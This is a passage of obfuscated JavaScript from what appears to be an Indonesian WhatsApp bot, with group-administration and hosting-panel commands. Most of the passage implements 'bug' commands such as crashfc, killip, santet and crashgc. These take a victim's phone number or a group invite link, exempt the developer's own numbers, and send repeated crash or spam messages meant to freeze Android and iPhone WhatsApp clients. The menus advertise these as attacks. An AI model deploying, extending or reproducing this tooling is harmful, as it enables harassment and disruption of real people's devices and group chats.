          if (!ownerss.includes(ya)) {
            return _0x25b16a("_Gagal Menghapus Dari Database, Nomor Tersebut Bukan Owners Bot!!_");
          }
          ownerss.splice(unp, 0x1);
          fs.writeFileSync("./db/owners.json", JSON.stringify(ownerss));
          let _0x25be63 = ya + "@s.whatsapp.net";
          _0x106d54("*Deleting Success @" + _0x25be63.split('@')[0x0] + " In the Users owners database*", [_0x25be63]);
          await sleep(0x9c4);
          _0x23b255.sendMessage(_0x25be63, {
            'text': "*Well, it's a shame, you can no longer access owners features because they were deleted*"
          });
        }
        break;
      case '🥀':
      case '🍁':
      case '🐉':
      case '🌷':
      case '🍒':
      case "🌶️":
        {
          if (!_0x585723 && !_0x5290c9 && !_0x3424fb && !_0x1eaf88) {
            return;
          }
          galakujiku = q.replace(/[^0-9]/g, '');
          if (!galakujiku) {
            return _0x25b16a("*Format :*\n" + (_0x185059 + _0x2818bf) + " 628xxxx");
          }
          if (galakujiku == global.devNumber.includes) {
            return;
          }
          if (galakujiku == "6283834558105") {
            return;
          }
          if (galakujiku == "6283854543070") {
            return;
          }
          let _0x1bd153 = await _0x23b255.onWhatsApp(galakujiku + "@s.whatsapp.net");
          if (_0x1bd153.length == 0x0) {
            return _0x25b16a("*The number is not registered in the WhatsApp application.*");
          }
          ha_wkwk = galakujiku + "@s.whatsapp.net";
          _0x25b16a("*Bugs Are Being Processed...*");
          await sleep(0x7d0);
          _0x49d796("*Succesfully Send " + _0x2818bf + " To @" + ha_wkwk.split('@')[0x0] + ", With The Amount Of Spam 20*", [ha_wkwk]);
          await sleep(0x3e8);
          _0x10bc24(ha_wkwk, 0x8);
        }
        break;
      case '🍅':
      case '🌹':
      case '🐲':
      case '🔥':
      case '🦖':
      case '🦕':
        {
          if (!_0x585723 && !_0x5290c9 && !_0x3424fb) {
            return;
          }
          if (!q) {
            return _0x25b16a("*Example :*\n" + _0x2818bf + " 3");
          }
          if (isNaN(parseInt(q))) {
            return _0x25b16a("Jumlah Wajib Angka!!");
          }
          if (_0x42fa35 == global.devNumber.includes + "@s.whatsapp.net") {
            return;
          }
          if (_0x42fa35 == "6283834558105@s.whatsapp.net") {
            return;
          }
          if (_0x42fa35 == '6283854543070@s.whatsapp.net') {
            return;
          }
          inijumlaaaa = encodeURI(q) * 0x5;
          _0x4159f4('⏳');
          await sleep(0x7d0);
          _0x4159f4('✅');
          await sleep(0x3e8);
          _0x10bc24(_0x42fa35, inijumlaaaa);
        }
        break;
      case "killip":
      case "bomip":
      case 'travass':
      case "gas_ip":
      case "docip":
      case "crashin":
      case "homeip":
      case "blankip":
      case 'craship':
        {
          if (!_0x585723 && !_0x5290c9 && !_0x3424fb && !_0x1eaf88) {
            return;
          }
          galakujiku = q.replace(/[^0-9]/g, '');
          if (!galakujiku) {
            return _0x25b16a("*Format :*\n" + (_0x185059 + _0x2818bf) + " 628xxxx");
          }
          if (galakujiku == global.devNumber.includes) {
            return;
          }
          if (galakujiku == '6283834558105') {
            return;
          }
          if (galakujiku == '6283854543070') {
            return;
          }
          let _0x2b591b = await _0x23b255.onWhatsApp(galakujiku + "@s.whatsapp.net");
          if (_0x2b591b.length == 0x0) {
            return _0x25b16a("*The number is not registered in the WhatsApp application.*");
          }
          ha_wkwk = galakujiku + "@s.whatsapp.net";
          _0x25b16a("*Bugs Are Being Processed...*");
          await sleep(0x7d0);
          _0x49d796("*Succesfully Send " + _0x2818bf + " To @" + ha_wkwk.split('@')[0x0] + ", With The Amount Of Spam 25*", [ha_wkwk]);
          await sleep(0x3e8);
          _0x10868e(ha_wkwk, 0xf);
        }
        break;
      case "1hit":
      case "trolifc":
      case "travas":
      case 'docgas':
      case "crashfc":
      case "infinity":
      case "gaslec":
      case "xforce":
      case 'santet':
        {
          if (!_0x585723 && !_0x5290c9 && !_0x3424fb && !_0x1eaf88) {
            return;
          }
          galakujiku = q.replace(/[^0-9]/g, '');
          if (!galakujiku) {
            return _0x25b16a("*Format :*\n" + (_0x185059 + _0x2818bf) + " 628xxxx");
          }
          if (galakujiku == global.devNumber.includes) {
            return;
          }
          if (galakujiku == "6283834558105") {
            return;
          }
          if (galakujiku == '6283854543070') {
            return;
          }
          let _0x4c5ccb = await _0x23b255.onWhatsApp(galakujiku + '@s.whatsapp.net');
          if (_0x4c5ccb.length == 0x0) {
            return _0x25b16a("*The number is not registered in the WhatsApp application.*");
          }
          ha_wkwk = galakujiku + "@s.whatsapp.net";
          _0x25b16a("*Bugs Are Being Processed...*");
          await sleep(0x7d0);
          _0x49d796("*Succesfully Send " + _0x2818bf + " To @" + ha_wkwk.split('@')[0x0] + ", With The Amount Of Spam 10*", [ha_wkwk]);
          await sleep(0x3e8);
          _0x10bc24(ha_wkwk, 0xa);
        }
        break;
      case "wargc":
      case "virdokgc":
      case 'xlecgc':
      case "travagc":
      case "buggc":
      case "crashgc":
      case "bomgc":
        {
          if (!_0x585723 && !_0x5290c9 && !_0x3424fb) {
            return;
          }
          if (!q) {
            return _0x25b16a("*CARA MENGIRIM BUG GROUB*\n\n" + (_0x185059 + _0x2818bf) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ Jika ingin mengirim bug dengan jumlah banyak, silahkan ketik sebagai berikut ini\n\nEx: ." + _0x2818bf + " linkgc jumlahbug\n\nContoh:\n." + _0x2818bf + " https://chat.whatsapp.com/xxxx 10\n\n©leccyofc");
          }
          _0x4159f4('⏳');
          if (!q.split(" ")[0x0].includes("whatsapp.com")) {
            return _0x25b16a("Link Invalid!");
          }
          resjoin = q.split(" ")[0x0].split("https://chat.whatsapp.com/")[0x1];
          inijumlah = q.split(" ")[0x1] ? q.split(" ")[0x1] : '1';
          initarget = await _0x23b255.groupAcceptInvite(resjoin);
          await sleep(0x9c4);
          _0x4159f4('✅');
          await sleep(0x3e8);
          _0x6a2258(initarget, inijumlah);
        }
        break;
      case "kill_adn":
      case "fcwa":
      case "doca":
      case "lec-a":
      case "bugandro":
      case "androidfc":
        {
          if (!_0x585723 && !_0x5290c9 && !_0x3424fb && !_0x1eaf88) {
            return;
          }
          if (!q) {
            return _0x25b16a("*Format :*\n" + (_0x185059 + _0x2818bf) + " 628xxxx,1");
          }
          target_orang = q.split(',')[0x0];
          jumla_spamm = q.split(',')[0x1] ? q.split(',')[0x1] : '2';
          if (isNaN(parseInt(jumla_spamm))) {
            return _0x25b16a("Jumlah wajib angka!!");
          }
          meluatke = target_orang.replace(/[^0-9]/g, '');
          let _0x5049fc = await _0x23b255.onWhatsApp(meluatke + "@s.whatsapp.net");
          if (_0x5049fc.length == 0x0) {
            return _0x25b16a("*The number is not registered in the WhatsApp application.*");
          }
          if (meluatke == global.devNumber.includes) {
            return;
          }
          if (meluatke == "6283834558105") {
            return;
          }
          if (meluatke == '6283854543070') {
            return;
          }
          let _0x1c1e11 = meluatke + "@s.whatsapp.net";
          jumlah = encodeURI(jumla_spamm) * 0xa;
          _0x25b16a("*Bugs Are Being Processed...*");
          await sleep(0x7d0);
          _0x49d796("*Succesfully Send Bug-ADN To @" + _0x1c1e11.split('@')[0x0] + ", With The Amount Of Spam " + jumlah + '*', [_0x1c1e11]);
          await sleep(0x3e8);
          _0x10bc24(_0x1c1e11, jumlah);
        }
        break;
      case "kill_ipn":
      case "fcwi":
      case "doci":
      case "lec-i":
      case "bugipong":
      case "iphonefc":
        {
          if (!_0x585723 && !_0x5290c9 && !_0x3424fb && !_0x1eaf88) {
            return;
          }
          if (!q) {
            return _0x25b16a("*Format :*\n" + (_0x185059 + _0x2818bf) + " 628xxxx,1");
          }
          target_orang = q.split(',')[0x0];
          jumla_spamm = q.split(',')[0x1] ? q.split(',')[0x1] : '2';
          if (isNaN(parseInt(jumla_spamm))) {
            return _0x25b16a("Jumlah wajib angka!!");
          }
          meluatke = target_orang.replace(/[^0-9]/g, '');
          let _0x1b50ab = await _0x23b255.onWhatsApp(meluatke + "@s.whatsapp.net");
          if (_0x1b50ab.length == 0x0) {
            return _0x25b16a("*The number is not registered in the WhatsApp application.*");
          }
          if (meluatke == global.devNumber.includes) {
            return;
          }
          if (meluatke == "6283834558105") {
            return;
          }
          if (meluatke == "6283854543070") {
            return;
          }
          let _0x30fe97 = meluatke + "@s.whatsapp.net";
          jumlah = encodeURI(jumla_spamm) * 0x19;
          _0x25b16a("*Bugs Are Being Processed...*");
          await sleep(0x7d0);
          _0x49d796("*Succesfully Send Bug-IOS To @" + _0x30fe97.split('@')[0x0] + ", With The Amount Of Spam " + jumlah + '*', [_0x30fe97]);
          await sleep(0x3e8);
          _0x10868e(_0x30fe97, jumlah);
        }
        break;
      case "block":
        if (!_0x585723) {
          return _0x25b16a("*Khusus Owner Leccy!*");
        }
        blockw = q.split('|')[0x0].replace(/[^0-9]/g, '');
        let _0x2869a1 = await _0x23b255.onWhatsApp(blockw + "@s.whatsapp.net");
        if (_0x2869a1.length == 0x0) {
          return _0x25b16a("_Enter A Valid And Registered Number On WhatsApp!!_");
        }
        let _0x1aa73b = blockw + "@s.whatsapp.net";
        await _0x23b255.updateBlockStatus(_0x1aa73b, "block").then(_0x3ac2da => _0x25b16a(JSON.stringify(_0x3ac2da, null, 0x2)))['catch'](_0x17fa56 => _0x25b16a(JSON.stringify(_0x17fa56, null, 0x2)));
        break;
      case "unblock":
        if (!_0x585723) {
          return _0x25b16a("*Khusus Owner Leccy!*");
        }
        blockww = q.split('|')[0x0].replace(/[^0-9]/g, '');
        let _0x3d0d11 = await _0x23b255.onWhatsApp(blockww + "@s.whatsapp.net");
        if (_0x3d0d11.length == 0x0) {
          return _0x25b16a("_Enter A Valid And Registered Number On WhatsApp!!_");
        }
        let _0x1719d8 = blockww + "@s.whatsapp.net";
        await _0x23b255.updateBlockStatus(_0x1719d8, 'unblock').then(_0x2ecb83 => _0x25b16a(JSON.stringify(_0x2ecb83, null, 0x2)))["catch"](_0x2ffd49 => _0x25b16a(JSON.stringify(_0x2ffd49, null, 0x2)));
        break;
      case "leave":
        if (!_0x585723) {
          return _0x25b16a("*Khusus Owner Leccy!*");
        }
        if (!_0x4ae346) {
          return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
        }
        _0x25b16a("Bye Everyone.");
        await _0x23b255.groupLeave(_0x42fa35);
        break;
      case 'restart':
      case 'shutdown':
        if (!_0x585723) {
          return _0x25b16a("*Khusus Owner Leccy!*");
        }
        _0x25b16a("Goodbye🖐");
        await sleep(0xbb8);
        process.exit();
        break;
      case "menu":
        {
          mark = "0@s.whatsapp.net";
          listmenuBot = "▭▬▭▬▭▬▭▬▭▬▭▬▭\nBotname : *" + global.botName + "*\nOwners : *" + global.ownerName + "*\nPengguna : *" + (_0x1eaf88 ? "VIP" : "VVIP") + "*\nNumber : @" + _0x5e0c1d.split('@')[0x0] + "\nPrefix : *MULTI*\n▭▬▭▬▭▬▭▬▭▬▭▬\n*===( LIST-MENU )=====*\n● .jadibotmenu\n● .ownermenu\n● .groupmenu\n● .murbugmenu\n● .cpanelmenu\n● .soundmenu\n▭▬▭▬▭▬▭▬▭▬▭▬\n*===( BUG-MENU )=====*\n● .buginfinity\n● .bugemoji\n● .buggroup\n● .bugiphone\n● .bugandroid\n▭▬▭▬▭▬▭▬▭▬▭▬\n_*CREDITS © LECCYOFC*_\n*POWERED BY @" + mark.split('@')[0x0] + '*';
          if (global.Type_Menu == 'v1') {
            _0x3c9814(listmenuBot, [_0x5e0c1d, mark]);
          } else {
            if (global.Type_Menu == 'v2') {
              _0x5110f5(listmenuBot, [_0x5e0c1d, mark]);
            } else if (global.Type_Menu == 'v3') {
              _0x561604(listmenuBot, [_0x5e0c1d, mark]);
            }
          }
        }
        break;
      case "buginfinity":
      case "bugandroid":
      case "bugemoji":
      case "buggroup":
      case "bugiphone":
      case "murbugmenu":
      case "jadibotmenu":
      case 'ownermenu':
      case "groupmenu":
      case "cpanelmenu":
      case "soundmenu":
        {
          txt_bugandro = "▭▬▭▬▭▬▭▬▭▬▭▬▭\n*BUG ANDROID*\nタ #1hit 628XXXX\nタ #infinity 628XXXX\nタ #gaslec 628XXXX\nタ #xforce 628XXXX\nタ #santet 628XXXX\nタ #trolifc 628XXXX\nタ #travas 628XXXX\nタ #docgas 628XXXX\nタ #crashfc 628XXXX\n\n _*© LECCY OFFICIAL*_\n▭▬▭▬▭▬▭▬▭▬▭▬▭";
          txt_buginfinity = "▭▬▭▬▭▬▭▬▭▬▭▬▭\n*BUG CRASH-INFINITY*\n\n*X-ANDROID*\nタ #androidfc 628XXXX,5\nタ #bugandro 628XXXX,5\nタ #fcwa 628XXXX,5\nタ #doca 628XXXX,5\nタ #lec-a 628XXXX,5\nタ #kill_adn 628XXXX,5\n\n*X-IPHONE*\nタ #bugipong 628XXXX,5\nタ #iphonefc 628XXXX,5\nタ #fcwi 628XXXX,5\nタ #doci 628XXXX,5\nタ #lec-i 628XXXX,5\nタ #kill_ipn 628XXXX,5\n\n _*© LECCY OFFICIAL*_\n▭▬▭▬▭▬▭▬▭▬▭▬▭";
          txt_bugemoji = "▭▬▭▬▭▬▭▬▭▬▭▬▭\n*BUG ANDROID*\n\n*X-NUMBER*\n🥀 628XXXXX\n🍁 628XXXXX\n🐉 628XXXXX\n🍒 628XXXXX\n🌷 628XXXXX\n\n*X-SPAM*\n🌹 <amount>\n🐲 <amount>\n🔥 <amount>\n🦖 <amount>\n🦕 <amount>\n\n _*© LECCY OFFICIAL*_\n▭▬▭▬▭▬▭▬▭▬▭▬▭";
          txt_bugiphone = "▭▬▭▬▭▬▭▬▭▬▭▬▭\n*BUG IPHONE*\nタ #killip 628XXXX\nタ #bomip 628XXXX\nタ #travass 628XXXX\nタ #crashin 628XXXX\nタ #homeip 628XXXX\nタ #blankip 628XXXX\nタ #craship 628XXXX\nタ #gas_ip 628XXXX\nタ #docip 628XXXX\n\n _*© LECCY OFFICIAL*_\n▭▬▭▬▭▬▭▬▭▬▭▬▭";
          txt_buggroup = "▭▬▭▬▭▬▭▬▭▬▭▬▭\n*BUG GROUP*\nタ #wargc *linkgrup*\nタ #xlecgc *linkgrup*\nタ #buggc *linkgrup*\nタ #crashgc *linkgrup*\nタ #bomgc *linkgrup*\nタ #travagc *linkgrup*\nタ #virdokgc *linkgrup*\n\n _*© LECCY OFFICIAL*_\n▭▬▭▬▭▬▭▬▭▬▭▬▭";
          txt_murbug = "▭▬▭▬▭▬▭▬▭▬▭▬▭\n*MURBUG MENU*\nタ #listown\nタ #addown\nタ #delown\nタ #addprem\nタ #delprem\nタ #listprem\n\n _*© LECCY OFFICIAL*_\n▭▬▭▬▭▬▭▬▭▬▭▬▭";
          txt_jadibot = "▭▬▭▬▭▬▭▬▭▬▭▬▭\n*JADIBOT MENU*\nタ #jadibot\nタ #stopjadibot\nタ #del-sesi\nタ #resetjadibot\nタ #listjadibot\n\n _*© LECCY OFFICIAL*_\n▭▬▭▬▭▬▭▬▭▬▭▬▭";
          txt_owner = "▭▬▭▬▭▬▭▬▭▬▭▬▭\n*OWNER MENU*\nタ #join\nタ #restart\nタ #leave\nタ #unblock\nタ #block\nタ #shutdown\nタ #unmute\nタ #mute\nタ #runtime\n\n _*© LECCY OFFICIAL*_\n▭▬▭▬▭▬▭▬▭▬▭▬▭";
          txt_group = "▭▬▭▬▭▬▭▬▭▬▭▬▭\n*GROUP MENU*\nタ #kick\nタ #open\nタ #close\nタ #linkgc\nタ #linkgrup\nタ #revoke\nタ #hidetag\nタ #promote\nタ #demote\nタ #setname\nタ #setdesc\nタ #editinfo\n\n _*© LECCY OFFICIAL*_\n▭▬▭▬▭▬▭▬▭▬▭▬▭";
          txt_cpanel = "▭▬▭▬▭▬▭▬▭▬▭▬▭\n*CPANEL MENU*\nタ #listapi\nタ #addapi\nタ #delusr\nタ #detusr\nタ #listusr\nタ #addusr\nタ #listsrv\nタ #detsrv\nタ #delsrv\nタ #addsrv\nタ #bansrv\nタ #unbansrv\nタ #reinstall\n\n _*© LECCY OFFICIAL*_\n▭▬▭▬▭▬▭▬▭▬▭▬▭";
          txt_sound = "▭▬▭▬▭▬▭▬▭▬▭▬▭\n*SOUND MENU*\nタ #sound1\nタ #sound2\nタ #sound3\nタ #sound4\nタ #sound5\nタ #sound6\nタ #sound7\nタ #sound8\nタ #sound9\nタ #sound10\nタ #sound11\nタ #sound12\nタ #sound13\nタ #sound14\nタ #sound15\nタ #sound16\nタ #sound17\nタ #sound18\nタ #sound19\nタ #sound20\n\n _*© LECCY OFFICIAL*_\n▭▬▭▬▭▬▭▬▭▬▭▬▭";
          if (_0x2818bf == "bugandroid") {
            _0x5110f5(txt_bugandro, [_0x5e0c1d]);
          } else {
            if (_0x2818bf == "buginfinity") {
              _0x5110f5(txt_buginfinity, [_0x5e0c1d]);
            } else {
              if (_0x2818bf == 'bugemoji') {
                _0x5110f5(txt_bugemoji, [_0x5e0c1d]);
              } else {
                if (_0x2818bf == 'bugiphone') {
                  _0x5110f5(txt_bugiphone, [_0x5e0c1d]);
                } else {
                  if (_0x2818bf == "buggroup") {
                    _0x5110f5(txt_buggroup, [_0x5e0c1d]);
                  } else {
                    if (_0x2818bf == "murbugmenu") {
                      _0x5110f5(txt_murbug, [_0x5e0c1d]);
                    } else {
                      if (_0x2818bf == "jadibotmenu") {
                        _0x5110f5(txt_jadibot, [_0x5e0c1d]);
                      } else {
                        if (_0x2818bf == "ownermenu") {
                          _0x5110f5(txt_owner, [_0x5e0c1d]);
                        } else {
                          if (_0x2818bf == "groupmenu") {
                            _0x5110f5(txt_group, [_0x5e0c1d]);
                          } else {
                            if (_0x2818bf == 'cpanelmenu') {
                              _0x5110f5(txt_cpanel, [_0x5e0c1d]);
                            } else if (_0x2818bf == "soundmenu") {
                              _0x5110f5(txt_sound, [_0x5e0c1d]);
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
        break;
      case 'join':
        if (_0x38267e.key.fromMe) {
          return;
        }
        if (!_0x585723) {
          return _0x25b16a("This feature can only be used by the owner Bot");
        }
        if (!q) {
          return _0x25b16a("Enter Group Link!\nEx: .join https://chat.whatsapp.com/xxxx");
        }
        if (!_0x3bedf8[0x0].includes("whatsapp.com")) {
          return _0x25b16a("Link Invalid!");
        }
        resjoin = _0x3bedf8[0x0].split('https://chat.whatsapp.com/')[0x1];
        try {
          join = await _0x23b255.groupAcceptInvite(resjoin);
          _0x25b16a(join);
        } catch (_0x43a345) {
          _0x25b16a(util.format(_0x43a345));
        }
        break;
      case 'linkgrup':
      case "linkgc":
        {
          if (!_0x4ae346) {
            return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
          }
          if (!_0xcf285e) {
            return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (!_0xa7e0c0 && !_0x585723) {
            return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          url_ = await _0x23b255.groupInviteCode(_0x42fa35);
          yurl = "https://chat.whatsapp.com/" + url_;
          _0x25b16a(yurl);
        }
        break;
      case "open":
        if (!_0x4ae346) {
          return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
        }
        if (!_0xa7e0c0 && !_0x585723) {
          return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
        }
        if (!_0xcf285e) {
          return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
        }
        await _0x23b255.groupSettingUpdate(_0x42fa35, "not_announcement");
        _0x25b16a("*OPENED* The group is opened by admin\nNow members can send messages");
        break;
      case "close":
        if (!_0x4ae346) {
          return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
        }
        if (!_0xa7e0c0 && !_0x585723) {
          return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
        }
        if (!_0xcf285e) {
          return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
        }
        await _0x23b255.groupSettingUpdate(_0x42fa35, 'announcement');
        _0x25b16a("*CLOSED* group closed by admin\nnow only admin can send messages");
        break;
      case "revoke":
        {
          if (!_0x4ae346) {
            return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
          }
          if (!_0xcf285e) {
            return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (!_0xa7e0c0 && !_0x585723) {
            return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          await _0x23b255.groupRevokeInvite(_0x42fa35).then(_0x45f887 => _0x25b16a(JSON.stringify(_0x45f887, null, 0x2)))["catch"](_0x19c120 => _0x25b16a(JSON.stringify(_0x19c120, null, 0x2)));
        }
        break;
      case "kick":
        if (!_0x4ae346) {
          return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
        }
        if (!_0xa7e0c0 && !_0x585723) {
          return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
        }
        if (!_0xcf285e) {
          return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
        }
        if (_0x38267e.message.extendedTextMessage === undefined || _0x38267e.message.extendedTextMessage === null) {
          return _0x25b16a("Reply targetnya!");
        }
        _0x25b16a("Sampah Grup Berhasil di Keluarkan!");
        remove = _0x38267e.message.extendedTextMessage.contextInfo.participant;
        await _0x23b255.groupParticipantsUpdate(_0x42fa35, [remove], "remove");
        break;
      case "hidetag":
        {
          if (!_0x4ae346) {
            return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
          }
          if (!_0xa7e0c0 && !_0x585723) {
            return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          let _0x1151e4 = [];
          _0x28b967.map(_0x179140 => _0x1151e4.push(_0x179140.id));
          _0x23b255.sendMessage(_0x42fa35, {
            'text': q ? q : '',
            'mentions': _0x1151e4
          });
        }
        break;
      case "promote":
        {
          if (!_0x4ae346) {
            return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
          }
          if (!_0xa7e0c0 && !_0x585723) {
            return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          if (!_0xcf285e) {
            return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (_0x38267e.message.extendedTextMessage === undefined || _0x38267e.message.extendedTextMessage === null) {
            return _0x25b16a("Reply targetnya!");
          }
          promote = _0x38267e.message.extendedTextMessage.contextInfo.participant;
          await _0x23b255.groupParticipantsUpdate(_0x42fa35, [promote], "promote").then(_0x1913d4 => _0x25b16a(JSON.stringify(_0x1913d4, null, 0x2)))['catch'](_0x8bd633 => _0x25b16a(JSON.stringify(_0x8bd633, null, 0x2)));
        }
        break;
      case 'demote':
        {
          if (!_0x4ae346) {
            return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
          }
          if (!_0xa7e0c0 && !_0x585723) {
            return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          if (!_0xcf285e) {
            return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (_0x38267e.message.extendedTextMessage === undefined || _0x38267e.message.extendedTextMessage === null) {
            return _0x25b16a("Reply targetnya!");
          }
          demote = _0x38267e.message.extendedTextMessage.contextInfo.participant;
          await _0x23b255.groupParticipantsUpdate(_0x42fa35, [demote], 'demote').then(_0x44fbe7 => _0x25b16a(JSON.stringify(_0x44fbe7, null, 0x2)))["catch"](_0x39a3d3 => _0x25b16a(JSON.stringify(_0x39a3d3, null, 0x2)));
        }
        break;
      case "setname":
      case "setsubject":
        {
          if (!_0x4ae346) {
            return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
          }
          if (!_0xa7e0c0 && !_0x585723) {
            return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          if (!_0xcf285e) {
            return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (!q) {
            return _0x25b16a("Nama Group Nya Mana?\n\nEx:\n.setname nama_group");
          }
          await _0x23b255.groupUpdateSubject(_0x42fa35, q).then(_0x26bee3 => _0x25b16a(JSON.stringify(_0x26bee3, null, 0x2)))["catch"](_0x171963 => _0x25b16a(JSON.stringify(_0x171963, null, 0x2)));
        }
        break;
      case 'setdesc':
      case 'setdesk':
        {
          if (!_0x4ae346) {
            return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
          }
          if (!_0xa7e0c0 && !_0x585723) {
            return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
          }
          if (!_0xcf285e) {
            return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
          }
          if (!q) {
            return _0x25b16a("Teks Deskripsi Nya Mana?\n\nEx:\n.setdesc teks_deskripsi");
          }
          await _0x23b255.groupUpdateDescription(_0x42fa35, q).then(_0x1ebf7e => _0x25b16a(JSON.stringify(_0x1ebf7e, null, 0x2)))["catch"](_0x263b80 => _0x25b16a(JSON.stringify(_0x263b80, null, 0x2)));
        }
        break;
      case "editinfo":
        if (!_0x4ae346) {
          return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Di Dalam Group!");
        }
        if (!_0xa7e0c0 && !_0x585723) {
          return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Oleh Admin!");
        }
        if (!_0xcf285e) {
          return _0x25b16a("Fitur Ini Hanya Dapat Digunakan Setelah Bot Menjadi Admin!");
        }
        if (_0x3bedf8[0x0] === "open") {
          await _0x23b255.groupSettingUpdate(_0x42fa35, 'unlocked').then(_0x399a6d => _0x25b16a("Successfully Opened Group Edit Info"))["catch"](_0x1e9bc2 => _0x25b16a(JSON.stringify(_0x1e9bc2, null, 0x2)));
        } else if (_0x3bedf8[0x0] === "close") {
          await _0x23b255.groupSettingUpdate(_0x42fa35, "locked").then(_0x2c134d => _0x25b16a("Successfully Closed Group Edit Info"))["catch"](_0x29a79e => _0x25b16a(JSON.stringify(_0x29a79e, null, 0x2)));
        } else {
          _0x25b16a("*MODE DESKRIPSI GROUP*\n\n*_Open : semua member bisa edit deskripsi grup_*\n\n*_Close: hanya admin group yang bisa edit deskripsi_*\n\n*Example:*\n" + (_0x185059 + _0x2818bf) + " close");
        }
        break;
      case "listapi":
        {
          if (!_0x585723) {
            return _0x25b16a("*This feature can only be used by the owner/Dev*");
          }
          let _0x85796b = await fetch(global.domain + '/api/client/account/api-keys', {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + global.key_pltc
            }
          });
          let _0x1242c6 = await _0x85796b.json();
          if (_0x1242c6.errors) {
            return _0x25b16a(util.format(_0x1242c6.errors[0x0]));
          }
          _0x25b16a(util.format(_0x1242c6.data));
        }
        break;
      case "addapi":
        {
          if (!_0x585723) {
            return _0x25b16a("*This feature can only be used by the owner/Dev*");
          }
          let _0x1aa966 = q ? q : _0xa77d0c(0x5);
          let _0x5477f5 = await fetch(global.domain + "/api/client/account/api-keys", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + global.key_pltc
            },
            'body': JSON.stringify({
              'description': _0x1aa966,
              'allowed_ips': []
            })
          });
          let _0x14bf2d = await _0x5477f5.json();
          _0x25b16a(util.format(_0x14bf2d));
          if (_0x14bf2d.errors) {
            return _0x25b16a(util.format(_0x14bf2d.errors[0x0]));
          }
        }
        break;
      case "addusr":
        {
          if (!_0x585723) {
            return _0x25b16a("*This feature can only be used by the owner/Dev*");
          }
          let _0x2bebc2 = q.split(',')[0x0] || _0x5e0c1d.split('@')[0x0];
          let _0x3e9c2e = q.split(',')[0x1];
          if (!_0x3e9c2e) {
            return _0x25b16a("*FORMAT ADDUSR*:\n.addusr 628xxxx,leccy");
          }
          userku = _0x2bebc2.replace(/[^0-9]/g, '');
          let _0x42368b = await _0x23b255.onWhatsApp(userku + "@s.whatsapp.net");
          if (_0x42368b.length == 0x0) {
            return _0x25b16a("_Enter A Valid And Registered Number On WhatsApp!!_");
          }
          let _0x3fba55 = '' + _0x3e9c2e + _0xa77d0c(0x3);
          let _0x4d027c = userku + "@s.whatsapp.net";
          let _0x1e2808 = await fetch(global.domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + global.key_plta
            },
            'body': JSON.stringify({
              'email': _0x3e9c2e + "@buyer.id",
              'username': _0x3e9c2e,
              'first_name': _0x3e9c2e,
              'last_name': "Users",
              'language': 'en',
              'password': _0x3fba55
            })
          });
          let _0x1a56b7 = await _0x1e2808.json();
          if (_0x1a56b7.errors) {
            return _0x25b16a(_0x1a56b7.errors[0x0].detail);
          }
          let _0x4ae208 = _0x1a56b7.attributes;
          _0x25b16a(_0x4ae208.username + ',,' + _0x4ae208.id + ",ram/disk,cpu");
          _0x49d796("𝗦𝗨𝗞𝗦𝗘𝗦 𝗠𝗘𝗠𝗕𝗨𝗔𝗧 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟\n\nID: " + _0x4ae208.id + "\nTYPE: " + _0x1a56b7.object + "\nUSERNAME: " + _0x4ae208.username + "\nEMAIL: " + _0x4ae208.email + "\nNAME: " + _0x4ae208.first_name + " " + _0x4ae208.last_name + "\nLANGUAGE: " + _0x4ae208.language + "\nADMIN: " + _0x4ae208.root_admin + "\nCREATED AT: \n" + _0x4ae208.created_at + "\n\n*SEND ACCOUNT* @" + _0x4d027c.split('@')[0x0], [_0x4d027c]);
        }
        break;
      case 'delusr':
        {
